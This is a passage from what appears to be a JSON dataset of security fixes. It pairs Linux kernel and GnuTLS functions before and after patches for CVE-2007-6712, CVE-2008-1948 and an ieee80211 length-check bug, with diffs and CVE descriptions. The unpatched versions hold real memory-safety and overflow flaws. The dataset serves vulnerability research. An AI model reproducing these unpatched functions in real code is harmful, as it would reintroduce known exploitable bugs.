(hostap_is_sta_assoc(ieee->ap, dst)) {\n\t\t\t/* send frame directly to the associated STA using\n\t\t\t * wireless media and not passing to higher layers */\n\t\t\tieee->ap->bridged_unicast++;\n\t\t\tskb2 = skb;\n\t\t\tskb = NULL;\n\t\t}\n\t}\n\n\tif (skb2 != NULL) {\n\t\t/* send to wireless media */\n\t\tskb2->dev = dev;\n\t\tskb2->protocol = __constant_htons(ETH_P_802_3);\n\t\tskb_reset_mac_header(skb2);\n\t\tskb_reset_network_header(skb2);\n\t\t/* skb2->network_header += ETH_HLEN; */\n\t\tdev_queue_xmit(skb2);\n\t}\n#endif\n\n\tif (skb) {\n\t\tskb->protocol = eth_type_trans(skb, dev);\n\t\tmemset(skb->cb, 0, sizeof(skb->cb));\n\t\tskb->ip_summed = CHECKSUM_NONE;\t/* 802.11 crc not sufficient */\n\t\tif (netif_rx(skb) == NET_RX_DROP) {\n\t\t\t/* netif_rx always succeeds, but it might drop\n\t\t\t * the packet.  If it drops the packet, we log that\n\t\t\t * in our stats. */\n\t\t\tIEEE80211_DEBUG_DROP\n\t\t\t    (\"RX: netif_rx dropped the packet\\n\");\n\t\t\tstats->rx_dropped++;\n\t\t}\n\t}\n\n      rx_exit:\n#ifdef NOT_YET\n\tif (sta)\n\t\thostap_handle_sta_release(sta);\n#endif\n\treturn 1;\n\n      rx_dropped:\n\tstats->rx_dropped++;\n\n\t/* Returning 0 indicates to caller that we have not handled the SKB--\n\t * so it is still allocated and can be used again by underlying\n\t * hardware as a DMA target */\n\treturn 0;\n}",
        "func": "int ieee80211_rx(struct ieee80211_device *ieee, struct sk_buff *skb,\n\t\t struct ieee80211_rx_stats *rx_stats)\n{\n\tstruct net_device *dev = ieee->dev;\n\tstruct ieee80211_hdr_4addr *hdr;\n\tsize_t hdrlen;\n\tu16 fc, type, stype, sc;\n\tstruct net_device_stats *stats;\n\tunsigned int frag;\n\tu8 *payload;\n\tu16 ethertype;\n#ifdef NOT_YET\n\tstruct net_device *wds = NULL;\n\tstruct sk_buff *skb2 = NULL;\n\tstruct net_device *wds = NULL;\n\tint frame_authorized = 0;\n\tint from_assoc_ap = 0;\n\tvoid *sta = NULL;\n#endif\n\tu8 dst[ETH_ALEN];\n\tu8 src[ETH_ALEN];\n\tstruct ieee80211_crypt_data *crypt = NULL;\n\tint keyidx = 0;\n\tint can_be_decrypted = 0;\n\n\thdr = (struct ieee80211_hdr_4addr *)skb->data;\n\tstats = &ieee->stats;\n\n\tif (skb->len < 10) {\n\t\tprintk(KERN_INFO \"%s: SKB length < 10\\n\", dev->name);\n\t\tgoto rx_dropped;\n\t}\n\n\tfc = le16_to_cpu(hdr->frame_ctl);\n\ttype = WLAN_FC_GET_TYPE(fc);\n\tstype = WLAN_FC_GET_STYPE(fc);\n\tsc = le16_to_cpu(hdr->seq_ctl);\n\tfrag = WLAN_GET_SEQ_FRAG(sc);\n\thdrlen = ieee80211_get_hdrlen(fc);\n\n\tif (skb->len < hdrlen) {\n\t\tprintk(KERN_INFO \"%s: invalid SKB length %d\\n\",\n\t\t\tdev->name, skb->len);\n\t\tgoto rx_dropped;\n\t}\n\n\t/* Put this code here so that we avoid duplicating it in all\n\t * Rx paths. - Jean II */\n#ifdef CONFIG_WIRELESS_EXT\n#ifdef IW_WIRELESS_SPY\t\t/* defined in iw_handler.h */\n\t/* If spy monitoring on */\n\tif (ieee->spy_data.spy_number > 0) {\n\t\tstruct iw_quality wstats;\n\n\t\twstats.updated = 0;\n\t\tif (rx_stats->mask & IEEE80211_STATMASK_RSSI) {\n\t\t\twstats.level = rx_stats->rssi;\n\t\t\twstats.updated |= IW_QUAL_LEVEL_UPDATED;\n\t\t} else\n\t\t\twstats.updated |= IW_QUAL_LEVEL_INVALID;\n\n\t\tif (rx_stats->mask & IEEE80211_STATMASK_NOISE) {\n\t\t\twstats.noise = rx_stats->noise;\n\t\t\twstats.updated |= IW_QUAL_NOISE_UPDATED;\n\t\t} else\n\t\t\twstats.updated |= IW_QUAL_NOISE_INVALID;\n\n\t\tif (rx_stats->mask & IEEE80211_STATMASK_SIGNAL) {\n\t\t\twstats.qual = rx_stats->signal;\n\t\t\twstats.updated |= IW_QUAL_QUAL_UPDATED;\n\t\t} else\n\t\t\twstats.updated |= IW_QUAL_QUAL_INVALID;\n\n\t\t/* Update spy records */\n\t\twireless_spy_update(ieee->dev, hdr->addr2, &wstats);\n\t}\n#endif\t\t\t\t/* IW_WIRELESS_SPY */\n#endif\t\t\t\t/* CONFIG_WIRELESS_EXT */\n\n#ifdef NOT_YET\n\thostap_update_rx_stats(local->ap, hdr, rx_stats);\n#endif\n\n\tif (ieee->iw_mode == IW_MODE_MONITOR) {\n\t\tstats->rx_packets++;\n\t\tstats->rx_bytes += skb->len;\n\t\tieee80211_monitor_rx(ieee, skb, rx_stats);\n\t\treturn 1;\n\t}\n\n\tcan_be_decrypted = (is_multicast_ether_addr(hdr->addr1) ||\n\t\t\t    is_broadcast_ether_addr(hdr->addr2)) ?\n\t    ieee->host_mc_decrypt : ieee->host_decrypt;\n\n\tif (can_be_decrypted) {\n\t\tif (skb->len >= hdrlen + 3) {\n\t\t\t/* Top two-bits of byte 3 are the key index */\n\t\t\tkeyidx = skb->data[hdrlen + 3] >> 6;\n\t\t}\n\n\t\t/* ieee->crypt[] is WEP_KEY (4) in length.  Given that keyidx\n\t\t * is only allowed 2-bits of storage, no value of keyidx can\n\t\t * be provided via above code that would result in keyidx\n\t\t * being out of range */\n\t\tcrypt = ieee->crypt[keyidx];\n\n#ifdef NOT_YET\n\t\tsta = NULL;\n\n\t\t/* Use station specific key to override default keys if the\n\t\t * receiver address is a unicast address (\"individual RA\"). If\n\t\t * bcrx_sta_key parameter is set, station specific key is used\n\t\t * even with broad/multicast targets (this is against IEEE\n\t\t * 802.11, but makes it easier to use different keys with\n\t\t * stations that do not support WEP key mapping). */\n\n\t\tif (!(hdr->addr1[0] & 0x01) || local->bcrx_sta_key)\n\t\t\t(void)hostap_handle_sta_crypto(local, hdr, &crypt,\n\t\t\t\t\t\t       &sta);\n#endif\n\n\t\t/* allow NULL decrypt to indicate an station specific override\n\t\t * for default encryption */\n\t\tif (crypt && (crypt->ops == NULL ||\n\t\t\t      crypt->ops->decrypt_mpdu == NULL))\n\t\t\tcrypt = NULL;\n\n\t\tif (!crypt && (fc & IEEE80211_FCTL_PROTECTED)) {\n\t\t\t/* This seems to be triggered by some (multicast?)\n\t\t\t * frames from other than current BSS, so just drop the\n\t\t\t * frames silently instead of filling system log with\n\t\t\t * these reports. */\n\t\t\tIEEE80211_DEBUG_DROP(\"Decryption failed (not set)\"\n\t\t\t\t\t     \" (SA=\" MAC_FMT \")\\n\",\n\t\t\t\t\t     MAC_ARG(hdr->addr2));\n\t\t\tieee->ieee_stats.rx_discards_undecryptable++;\n\t\t\tgoto rx_dropped;\n\t\t}\n\t}\n#ifdef NOT_YET\n\tif (type != WLAN_FC_TYPE_DATA) {\n\t\tif (type == WLAN_FC_TYPE_MGMT && stype == WLAN_FC_STYPE_AUTH &&\n\t\t    fc & IEEE80211_FCTL_PROTECTED && ieee->host_decrypt &&\n\t\t    (keyidx = hostap_rx_frame_decrypt(ieee, skb, crypt)) < 0) {\n\t\t\tprintk(KERN_DEBUG \"%s: failed to decrypt mgmt::auth \"\n\t\t\t       \"from \" MAC_FMT \"\\n\", dev->name,\n\t\t\t       MAC_ARG(hdr->addr2));\n\t\t\t/* TODO: could inform hostapd about this so that it\n\t\t\t * could send auth failure report */\n\t\t\tgoto rx_dropped;\n\t\t}\n\n\t\tif (ieee80211_rx_frame_mgmt(ieee, skb, rx_stats, type, stype))\n\t\t\tgoto rx_dropped;\n\t\telse\n\t\t\tgoto rx_exit;\n\t}\n#endif\n\t/* drop duplicate 802.11 retransmissions (IEEE 802.11 Chap. 9.29) */\n\tif (sc == ieee->prev_seq_ctl)\n\t\tgoto rx_dropped;\n\telse\n\t\tieee->prev_seq_ctl = sc;\n\n\t/* Data frame - extract src/dst addresses */\n\tif (skb->len < IEEE80211_3ADDR_LEN)\n\t\tgoto rx_dropped;\n\n\tswitch (fc & (IEEE80211_FCTL_FROMDS | IEEE80211_FCTL_TODS)) {\n\tcase IEEE80211_FCTL_FROMDS:\n\t\tmemcpy(dst, hdr->addr1, ETH_ALEN);\n\t\tmemcpy(src, hdr->addr3, ETH_ALEN);\n\t\tbreak;\n\tcase IEEE80211_FCTL_TODS:\n\t\tmemcpy(dst, hdr->addr3, ETH_ALEN);\n\t\tmemcpy(src, hdr->addr2, ETH_ALEN);\n\t\tbreak;\n\tcase IEEE80211_FCTL_FROMDS | IEEE80211_FCTL_TODS:\n\t\tif (skb->len < IEEE80211_4ADDR_LEN)\n\t\t\tgoto rx_dropped;\n\t\tmemcpy(dst, hdr->addr3, ETH_ALEN);\n\t\tmemcpy(src, hdr->addr4, ETH_ALEN);\n\t\tbreak;\n\tcase 0:\n\t\tmemcpy(dst, hdr->addr1, ETH_ALEN);\n\t\tmemcpy(src, hdr->addr2, ETH_ALEN);\n\t\tbreak;\n\t}\n\n#ifdef NOT_YET\n\tif (hostap_rx_frame_wds(ieee, hdr, fc, &wds))\n\t\tgoto rx_dropped;\n\tif (wds) {\n\t\tskb->dev = dev = wds;\n\t\tstats = hostap_get_stats(dev);\n\t}\n\n\tif (ieee->iw_mode == IW_MODE_MASTER && !wds &&\n\t    (fc & (IEEE80211_FCTL_TODS | IEEE80211_FCTL_FROMDS)) ==\n\t    IEEE80211_FCTL_FROMDS && ieee->stadev\n\t    && !compare_ether_addr(hdr->addr2, ieee->assoc_ap_addr)) {\n\t\t/* Frame from BSSID of the AP for which we are a client */\n\t\tskb->dev = dev = ieee->stadev;\n\t\tstats = hostap_get_stats(dev);\n\t\tfrom_assoc_ap = 1;\n\t}\n#endif\n\n\tdev->last_rx = jiffies;\n\n#ifdef NOT_YET\n\tif ((ieee->iw_mode == IW_MODE_MASTER ||\n\t     ieee->iw_mode == IW_MODE_REPEAT) && !from_assoc_ap) {\n\t\tswitch (hostap_handle_sta_rx(ieee, dev, skb, rx_stats,\n\t\t\t\t\t     wds != NULL)) {\n\t\tcase AP_RX_CONTINUE_NOT_AUTHORIZED:\n\t\t\tframe_authorized = 0;\n\t\t\tbreak;\n\t\tcase AP_RX_CONTINUE:\n\t\t\tframe_authorized = 1;\n\t\t\tbreak;\n\t\tcase AP_RX_DROP:\n\t\t\tgoto rx_dropped;\n\t\tcase AP_RX_EXIT:\n\t\t\tgoto rx_exit;\n\t\t}\n\t}\n#endif\n\n\t/* Nullfunc frames may have PS-bit set, so they must be passed to\n\t * hostap_handle_sta_rx() before being dropped here. */\n\n\tstype &= ~IEEE80211_STYPE_QOS_DATA;\n\n\tif (stype != IEEE80211_STYPE_DATA &&\n\t    stype != IEEE80211_STYPE_DATA_CFACK &&\n\t    stype != IEEE80211_STYPE_DATA_CFPOLL &&\n\t    stype != IEEE80211_STYPE_DATA_CFACKPOLL) {\n\t\tif (stype != IEEE80211_STYPE_NULLFUNC)\n\t\t\tIEEE80211_DEBUG_DROP(\"RX: dropped data frame \"\n\t\t\t\t\t     \"with no data (type=0x%02x, \"\n\t\t\t\t\t     \"subtype=0x%02x, len=%d)\\n\",\n\t\t\t\t\t     type, stype, skb->len);\n\t\tgoto rx_dropped;\n\t}\n\n\t/* skb: hdr + (possibly fragmented, possibly encrypted) payload */\n\n\tif ((fc & IEEE80211_FCTL_PROTECTED) && can_be_decrypted &&\n\t    (keyidx = ieee80211_rx_frame_decrypt(ieee, skb, crypt)) < 0)\n\t\tgoto rx_dropped;\n\n\thdr = (struct ieee80211_hdr_4addr *)skb->data;\n\n\t/* skb: hdr + (possibly fragmented) plaintext payload */\n\t// PR: FIXME: hostap has additional conditions in the \"if\" below:\n\t// ieee->host_decrypt && (fc & IEEE80211_FCTL_PROTECTED) &&\n\tif ((frag != 0) || (fc & IEEE80211_FCTL_MOREFRAGS)) {\n\t\tint flen;\n\t\tstruct sk_buff *frag_skb = ieee80211_frag_cache_get(ieee, hdr);\n\t\tIEEE80211_DEBUG_FRAG(\"Rx Fragment received (%u)\\n\", frag);\n\n\t\tif (!frag_skb) {\n\t\t\tIEEE80211_DEBUG(IEEE80211_DL_RX | IEEE80211_DL_FRAG,\n\t\t\t\t\t\"Rx cannot get skb from fragment \"\n\t\t\t\t\t\"cache (morefrag=%d seq=%u frag=%u)\\n\",\n\t\t\t\t\t(fc & IEEE80211_FCTL_MOREFRAGS) != 0,\n\t\t\t\t\tWLAN_GET_SEQ_SEQ(sc), frag);\n\t\t\tgoto rx_dropped;\n\t\t}\n\n\t\tflen = skb->len;\n\t\tif (frag != 0)\n\t\t\tflen -= hdrlen;\n\n\t\tif (frag_skb->tail + flen > frag_skb->end) {\n\t\t\tprintk(KERN_WARNING \"%s: host decrypted and \"\n\t\t\t       \"reassembled frame did not fit skb\\n\",\n\t\t\t       dev->name);\n\t\t\tieee80211_frag_cache_invalidate(ieee, hdr);\n\t\t\tgoto rx_dropped;\n\t\t}\n\n\t\tif (frag == 0) {\n\t\t\t/* copy first fragment (including full headers) into\n\t\t\t * beginning of the fragment cache skb */\n\t\t\tskb_copy_from_linear_data(skb, skb_put(frag_skb, flen), flen);\n\t\t} else {\n\t\t\t/* append frame payload to the end of the fragment\n\t\t\t * cache skb */\n\t\t\tskb_copy_from_linear_data_offset(skb, hdrlen,\n\t\t\t\t      skb_put(frag_skb, flen), flen);\n\t\t}\n\t\tdev_kfree_skb_any(skb);\n\t\tskb = NULL;\n\n\t\tif (fc & IEEE80211_FCTL_MOREFRAGS) {\n\t\t\t/* more fragments expected - leave the skb in fragment\n\t\t\t * cache for now; it will be delivered to upper layers\n\t\t\t * after all fragments have been received */\n\t\t\tgoto rx_exit;\n\t\t}\n\n\t\t/* this was the last fragment and the frame will be\n\t\t * delivered, so remove skb from fragment cache */\n\t\tskb = frag_skb;\n\t\thdr = (struct ieee80211_hdr_4addr *)skb->data;\n\t\tieee80211_frag_cache_invalidate(ieee, hdr);\n\t}\n\n\t/* skb: hdr + (possible reassembled) full MSDU payload; possibly still\n\t * encrypted/authenticated */\n\tif ((fc & IEEE80211_FCTL_PROTECTED) && can_be_decrypted &&\n\t    ieee80211_rx_frame_decrypt_msdu(ieee, skb, keyidx, crypt))\n\t\tgoto rx_dropped;\n\n\thdr = (struct ieee80211_hdr_4addr *)skb->data;\n\tif (crypt && !(fc & IEEE80211_FCTL_PROTECTED) && !ieee->open_wep) {\n\t\tif (\t\t/*ieee->ieee802_1x && */\n\t\t\t   ieee80211_is_eapol_frame(ieee, skb)) {\n\t\t\t/* pass unencrypted EAPOL frames even if encryption is\n\t\t\t * configured */\n\t\t} else {\n\t\t\tIEEE80211_DEBUG_DROP(\"encryption configured, but RX \"\n\t\t\t\t\t     \"frame not encrypted (SA=\" MAC_FMT\n\t\t\t\t\t     \")\\n\", MAC_ARG(hdr->addr2));\n\t\t\tgoto rx_dropped;\n\t\t}\n\t}\n\n\tif (crypt && !(fc & IEEE80211_FCTL_PROTECTED) && !ieee->open_wep &&\n\t    !ieee80211_is_eapol_frame(ieee, skb)) {\n\t\tIEEE80211_DEBUG_DROP(\"dropped unencrypted RX data \"\n\t\t\t\t     \"frame from \" MAC_FMT\n\t\t\t\t     \" (drop_unencrypted=1)\\n\",\n\t\t\t\t     MAC_ARG(hdr->addr2));\n\t\tgoto rx_dropped;\n\t}\n\n\t/* If the frame was decrypted in hardware, we may need to strip off\n\t * any security data (IV, ICV, etc) that was left behind */\n\tif (!can_be_decrypted && (fc & IEEE80211_FCTL_PROTECTED) &&\n\t    ieee->host_strip_iv_icv) {\n\t\tint trimlen = 0;\n\n\t\t/* Top two-bits of byte 3 are the key index */\n\t\tif (skb->len >= hdrlen + 3)\n\t\t\tkeyidx = skb->data[hdrlen + 3] >> 6;\n\n\t\t/* To strip off any security data which appears before the\n\t\t * payload, we simply increase hdrlen (as the header gets\n\t\t * chopped off immediately below). For the security data which\n\t\t * appears after the payload, we use skb_trim. */\n\n\t\tswitch (ieee->sec.encode_alg[keyidx]) {\n\t\tcase SEC_ALG_WEP:\n\t\t\t/* 4 byte IV */\n\t\t\thdrlen += 4;\n\t\t\t/* 4 byte ICV */\n\t\t\ttrimlen = 4;\n\t\t\tbreak;\n\t\tcase SEC_ALG_TKIP:\n\t\t\t/* 4 byte IV, 4 byte ExtIV */\n\t\t\thdrlen += 8;\n\t\t\t/* 8 byte MIC, 4 byte ICV */\n\t\t\ttrimlen = 12;\n\t\t\tbreak;\n\t\tcase SEC_ALG_CCMP:\n\t\t\t/* 8 byte CCMP header */\n\t\t\thdrlen += 8;\n\t\t\t/* 8 byte MIC */\n\t\t\ttrimlen = 8;\n\t\t\tbreak;\n\t\t}\n\n\t\tif (skb->len < trimlen)\n\t\t\tgoto rx_dropped;\n\n\t\t__skb_trim(skb, skb->len - trimlen);\n\n\t\tif (skb->len < hdrlen)\n\t\t\tgoto rx_dropped;\n\t}\n\n\t/* skb: hdr + (possible reassembled) full plaintext payload */\n\n\tpayload = skb->data + hdrlen;\n\tethertype = (payload[6] << 8) | payload[7];\n\n#ifdef NOT_YET\n\t/* If IEEE 802.1X is used, check whether the port is authorized to send\n\t * the received frame. */\n\tif (ieee->ieee802_1x && ieee->iw_mode == IW_MODE_MASTER) {\n\t\tif (ethertype == ETH_P_PAE) {\n\t\t\tprintk(KERN_DEBUG \"%s: RX: IEEE 802.1X frame\\n\",\n\t\t\t       dev->name);\n\t\t\tif (ieee->hostapd && ieee->apdev) {\n\t\t\t\t/* Send IEEE 802.1X frames to the user\n\t\t\t\t * space daemon for processing */\n\t\t\t\tprism2_rx_80211(ieee->apdev, skb, rx_stats,\n\t\t\t\t\t\tPRISM2_RX_MGMT);\n\t\t\t\tieee->apdevstats.rx_packets++;\n\t\t\t\tieee->apdevstats.rx_bytes += skb->len;\n\t\t\t\tgoto rx_exit;\n\t\t\t}\n\t\t} else if (!frame_authorized) {\n\t\t\tprintk(KERN_DEBUG \"%s: dropped frame from \"\n\t\t\t       \"unauthorized port (IEEE 802.1X): \"\n\t\t\t       \"ethertype=0x%04x\\n\", dev->name, ethertype);\n\t\t\tgoto rx_dropped;\n\t\t}\n\t}\n#endif\n\n\t/* convert hdr + possible LLC headers into Ethernet header */\n\tif (skb->len - hdrlen >= 8 &&\n\t    ((memcmp(payload, rfc1042_header, SNAP_SIZE) == 0 &&\n\t      ethertype != ETH_P_AARP && ethertype != ETH_P_IPX) ||\n\t     memcmp(payload, bridge_tunnel_header, SNAP_SIZE) == 0)) {\n\t\t/* remove RFC1042 or Bridge-Tunnel encapsulation and\n\t\t * replace EtherType */\n\t\tskb_pull(skb, hdrlen + SNAP_SIZE);\n\t\tmemcpy(skb_push(skb, ETH_ALEN), src, ETH_ALEN);\n\t\tmemcpy(skb_push(skb, ETH_ALEN), dst, ETH_ALEN);\n\t} else {\n\t\tu16 len;\n\t\t/* Leave Ethernet header part of hdr and full payload */\n\t\tskb_pull(skb, hdrlen);\n\t\tlen = htons(skb->len);\n\t\tmemcpy(skb_push(skb, 2), &len, 2);\n\t\tmemcpy(skb_push(skb, ETH_ALEN), src, ETH_ALEN);\n\t\tmemcpy(skb_push(skb, ETH_ALEN), dst, ETH_ALEN);\n\t}\n\n#ifdef NOT_YET\n\tif (wds && ((fc & (IEEE80211_FCTL_TODS | IEEE80211_FCTL_FROMDS)) ==\n\t\t    IEEE80211_FCTL_TODS) && skb->len >= ETH_HLEN + ETH_ALEN) {\n\t\t/* Non-standard frame: get addr4 from its bogus location after\n\t\t * the payload */\n\t\tskb_copy_to_linear_data_offset(skb, ETH_ALEN,\n\t\t\t\t\t       skb->data + skb->len - ETH_ALEN,\n\t\t\t\t\t       ETH_ALEN);\n\t\tskb_trim(skb, skb->len - ETH_ALEN);\n\t}\n#endif\n\n\tstats->rx_packets++;\n\tstats->rx_bytes += skb->len;\n\n#ifdef NOT_YET\n\tif (ieee->iw_mode == IW_MODE_MASTER && !wds && ieee->ap->bridge_packets) {\n\t\tif (dst[0] & 0x01) {\n\t\t\t/* copy multicast frame both to the higher layers and\n\t\t\t * to the wireless media */\n\t\t\tieee->ap->bridged_multicast++;\n\t\t\tskb2 = skb_clone(skb, GFP_ATOMIC);\n\t\t\tif (skb2 == NULL)\n\t\t\t\tprintk(KERN_DEBUG \"%s: skb_clone failed for \"\n\t\t\t\t       \"multicast frame\\n\", dev->name);\n\t\t} else if (hostap_is_sta_assoc(ieee->ap, dst)) {\n\t\t\t/* send frame directly to the associated STA using\n\t\t\t * wireless media and not passing to higher layers */\n\t\t\tieee->ap->bridged_unicast++;\n\t\t\tskb2 = skb;\n\t\t\tskb = NULL;\n\t\t}\n\t}\n\n\tif (skb2 != NULL) {\n\t\t/* send to wireless media */\n\t\tskb2->dev = dev;\n\t\tskb2->protocol = __constant_htons(ETH_P_802_3);\n\t\tskb_reset_mac_header(skb2);\n\t\tskb_reset_network_header(skb2);\n\t\t/* skb2->network_header += ETH_HLEN; */\n\t\tdev_queue_xmit(skb2);\n\t}\n#endif\n\n\tif (skb) {\n\t\tskb->protocol = eth_type_trans(skb, dev);\n\t\tmemset(skb->cb, 0, sizeof(skb->cb));\n\t\tskb->ip_summed = CHECKSUM_NONE;\t/* 802.11 crc not sufficient */\n\t\tif (netif_rx(skb) == NET_RX_DROP) {\n\t\t\t/* netif_rx always succeeds, but it might drop\n\t\t\t * the packet.  If it drops the packet, we log that\n\t\t\t * in our stats. */\n\t\t\tIEEE80211_DEBUG_DROP\n\t\t\t    (\"RX: netif_rx dropped the packet\\n\");\n\t\t\tstats->rx_dropped++;\n\t\t}\n\t}\n\n      rx_exit:\n#ifdef NOT_YET\n\tif (sta)\n\t\thostap_handle_sta_release(sta);\n#endif\n\treturn 1;\n\n      rx_dropped:\n\tstats->rx_dropped++;\n\n\t/* Returning 0 indicates to caller that we have not handled the SKB--\n\t * so it is still allocated and can be used again by underlying\n\t * hardware as a DMA target */\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -37,6 +37,12 @@\n \tsc = le16_to_cpu(hdr->seq_ctl);\n \tfrag = WLAN_GET_SEQ_FRAG(sc);\n \thdrlen = ieee80211_get_hdrlen(fc);\n+\n+\tif (skb->len < hdrlen) {\n+\t\tprintk(KERN_INFO \"%s: invalid SKB length %d\\n\",\n+\t\t\tdev->name, skb->len);\n+\t\tgoto rx_dropped;\n+\t}\n \n \t/* Put this code here so that we avoid duplicating it in all\n \t * Rx paths. - Jean II */",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "",
                "\tif (skb->len < hdrlen) {",
                "\t\tprintk(KERN_INFO \"%s: invalid SKB length %d\\n\",",
                "\t\t\tdev->name, skb->len);",
                "\t\tgoto rx_dropped;",
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2007-6712",
        "func_name": "kernel/git/chris/linux/hrtimer_forward",
        "description": "Integer overflow in the hrtimer_forward function (hrtimer.c) in Linux kernel 2.6.21-rc4, when running on 64-bit systems, allows local users to cause a denial of service (infinite loop) via a timer with a large expiry value, which causes the timer to always be expired.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/chris/linux.git;a=commitdiff;h=13788ccc41ceea5893f9c747c59bc0b28f2416c2",
        "commit_title": "hrtimer_forward() does not check for the possible overflow of",
        "commit_text": "timer->expires.  This can happen on 64 bit machines with large interval values and results currently in an endless loop in the softirq because the expiry value becomes negative and therefor the timer is expired all the time.  Check for this condition and set the expiry value to the max.  expiry time in the future.  The fix should be applied to stable kernel series as well.  Cc: <stable@kernel.org> ",
        "func_before": "unsigned long\nhrtimer_forward(struct hrtimer *timer, ktime_t now, ktime_t interval)\n{\n\tunsigned long orun = 1;\n\tktime_t delta;\n\n\tdelta = ktime_sub(now, timer->expires);\n\n\tif (delta.tv64 < 0)\n\t\treturn 0;\n\n\tif (interval.tv64 < timer->base->resolution.tv64)\n\t\tinterval.tv64 = timer->base->resolution.tv64;\n\n\tif (unlikely(delta.tv64 >= interval.tv64)) {\n\t\ts64 incr = ktime_to_ns(interval);\n\n\t\torun = ktime_divns(delta, incr);\n\t\ttimer->expires = ktime_add_ns(timer->expires, incr * orun);\n\t\tif (timer->expires.tv64 > now.tv64)\n\t\t\treturn orun;\n\t\t/*\n\t\t * This (and the ktime_add() below) is the\n\t\t * correction for exact:\n\t\t */\n\t\torun++;\n\t}\n\ttimer->expires = ktime_add(timer->expires, interval);\n\n\treturn orun;\n}",
        "func": "unsigned long\nhrtimer_forward(struct hrtimer *timer, ktime_t now, ktime_t interval)\n{\n\tunsigned long orun = 1;\n\tktime_t delta;\n\n\tdelta = ktime_sub(now, timer->expires);\n\n\tif (delta.tv64 < 0)\n\t\treturn 0;\n\n\tif (interval.tv64 < timer->base->resolution.tv64)\n\t\tinterval.tv64 = timer->base->resolution.tv64;\n\n\tif (unlikely(delta.tv64 >= interval.tv64)) {\n\t\ts64 incr = ktime_to_ns(interval);\n\n\t\torun = ktime_divns(delta, incr);\n\t\ttimer->expires = ktime_add_ns(timer->expires, incr * orun);\n\t\tif (timer->expires.tv64 > now.tv64)\n\t\t\treturn orun;\n\t\t/*\n\t\t * This (and the ktime_add() below) is the\n\t\t * correction for exact:\n\t\t */\n\t\torun++;\n\t}\n\ttimer->expires = ktime_add(timer->expires, interval);\n\t/*\n\t * Make sure, that the result did not wrap with a very large\n\t * interval.\n\t */\n\tif (timer->expires.tv64 < 0)\n\t\ttimer->expires = ktime_set(KTIME_SEC_MAX, 0);\n\n\treturn orun;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -26,6 +26,12 @@\n \t\torun++;\n \t}\n \ttimer->expires = ktime_add(timer->expires, interval);\n+\t/*\n+\t * Make sure, that the result did not wrap with a very large\n+\t * interval.\n+\t */\n+\tif (timer->expires.tv64 < 0)\n+\t\ttimer->expires = ktime_set(KTIME_SEC_MAX, 0);\n \n \treturn orun;\n }",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t/*",
                "\t * Make sure, that the result did not wrap with a very large",
                "\t * interval.",
                "\t */",
                "\tif (timer->expires.tv64 < 0)",
                "\t\ttimer->expires = ktime_set(KTIME_SEC_MAX, 0);"
            ]
        }
    },
    {
        "cve_id": "CVE-2008-1948",
        "func_name": "gnutls/_gnutls_server_name_recv_params",
        "description": "The _gnutls_server_name_recv_params function in lib/ext_server_name.c in libgnutls in gnutls-serv in GnuTLS before 2.2.4 does not properly calculate the number of Server Names in a TLS 1.0 Client Hello message during extension handling, which allows remote attackers to cause a denial of service (crash) or possibly execute arbitrary code via a zero value for the length of Server Names, which leads to a buffer overflow in session resumption data in the pack_security_parameters function, aka GNUTLS-SA-2008-1-1.",
        "git_url": "http://git.savannah.gnu.org/gitweb/?p=gnutls.git;a=commit;h=bc8102405fda11ea00ca3b42acc4f4bce9d6e97b",
        "commit_title": "",
        "commit_text": "Fix GNUTLS-SA-2008-1 security vulnerabilities. See http://www.gnu.org/software/gnutls/security.html for updates. ",
        "func_before": "int\n_gnutls_server_name_recv_params (gnutls_session_t session,\n\t\t\t\t const opaque * data, size_t _data_size)\n{\n  int i;\n  const unsigned char *p;\n  uint16_t len, type;\n  ssize_t data_size = _data_size;\n  int server_names = 0;\n\n  if (session->security_parameters.entity == GNUTLS_SERVER)\n    {\n      DECR_LENGTH_RET (data_size, 2, 0);\n      len = _gnutls_read_uint16 (data);\n\n      if (len != data_size)\n\t{\n\t  /* This is unexpected packet length, but\n\t   * just ignore it, for now.\n\t   */\n\t  gnutls_assert ();\n\t  return 0;\n\t}\n\n      p = data + 2;\n\n      /* Count all server_names in the packet. */\n      while (data_size > 0)\n\t{\n\t  DECR_LENGTH_RET (data_size, 1, 0);\n\t  p++;\n\n\t  DECR_LEN (data_size, 2);\n\t  len = _gnutls_read_uint16 (p);\n\t  p += 2;\n\n\t  DECR_LENGTH_RET (data_size, len, 0);\n\t  server_names++;\n\n\t  p += len;\n\t}\n\n      session->security_parameters.extensions.server_names_size =\n\tserver_names;\n      if (server_names == 0)\n\treturn 0;\t\t/* no names found */\n\n      /* we cannot accept more server names.\n       */\n      if (server_names > MAX_SERVER_NAME_EXTENSIONS)\n\tserver_names = MAX_SERVER_NAME_EXTENSIONS;\n\n      p = data + 2;\n      for (i = 0; i < server_names; i++)\n\t{\n\t  type = *p;\n\t  p++;\n\n\t  len = _gnutls_read_uint16 (p);\n\t  p += 2;\n\n\t  switch (type)\n\t    {\n\t    case 0:\t\t/* NAME_DNS */\n\t      if (len <= MAX_SERVER_NAME_SIZE)\n\t\t{\n\t\t  memcpy (session->security_parameters.extensions.\n\t\t\t  server_names[i].name, p, len);\n\t\t  session->security_parameters.extensions.\n\t\t    server_names[i].name_length = len;\n\t\t  session->security_parameters.extensions.\n\t\t    server_names[i].type = GNUTLS_NAME_DNS;\n\t\t  break;\n\t\t}\n\t    }\n\n\t  /* move to next record */\n\t  p += len;\n\t}\n    }\n  return 0;\n}",
